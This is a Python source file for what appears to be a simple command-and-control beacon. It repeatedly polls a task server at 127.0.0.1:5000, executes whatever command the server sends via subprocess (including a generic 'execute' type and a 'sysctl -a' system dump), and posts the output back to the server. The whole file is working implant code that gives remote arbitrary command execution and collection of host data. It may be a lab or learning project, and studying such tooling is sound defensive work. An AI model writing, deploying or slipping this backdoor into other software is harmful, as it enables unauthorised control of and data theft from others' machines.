import time
import requests
import subprocess


def fetch_next_task():
    return requests.get('http://127.0.0.1:5000/next_task')


def build_command(task):
    # builds a command from the task json
    command = []
    for key in task:
        if key not in ["_id", "task_id", "task_type", "task_status"]:
            print(f"{key}: {task[key]}")
            command.append(task[key])
    return command


def parse_output(output):
    # Remove new lines
    output = output.decode('UTF-8')
    print(f"parsed output: {output}")
    print(type(output))
    return output


def execute_task(task):
    success = True
    command = []
    # Assume we have 4 task_types
    task_type = task["task_type"]
    if task_type == "ping":
        command.append(task_type)
        command.extend(build_command(task))
    elif task_type == "proc":
        # Needs formatting
        command.append("sysctl")
        command.append("-a")
    elif task_type == "execute":
        command = build_command(task)
    # Perform task
    print(f"command : {command}")
    print("[!] Performing Task...")
    process = subprocess.run(command, capture_output=True, timeout=30)
    if process.returncode != 0:
        print("[!] error")
        # std error
        success = False
        output = parse_output(process.stderr)
    else:
        output = parse_output(process.stdout)
    task_result = {"output": output, "success": success}
    return task_result


def beacon_loop():
    print("Starting beacon loop")
    success = True
    while True:
        time.sleep(10)
        print("Looping")
        # 1. Fetch next task
        task = fetch_next_task()
        json = task.json()
        if task.status_code != 200:
            print(f"INFO: {json['error']}")
            continue
        # 2. Execute Task
        results = execute_task(json)
        if not results["success"]:
            # add the parsed message
            contents = f"Execution of task \nid: \"{json['task_id']}\" \ntype \"{json['task_type']}\" failed. " \
                       f"\noutput: {results['output']}"
            success = False
        else:
            contents = results["output"]
        # 4. POST results
        result = requests.post('http://127.0.0.1:5000/results', json=[
            {
                'task_id': json['task_id'], 'contents': contents, 'success': success
            }
        ])
        print(f"POST Result {result}")


if __name__ == '__main__':
    beacon_loop()
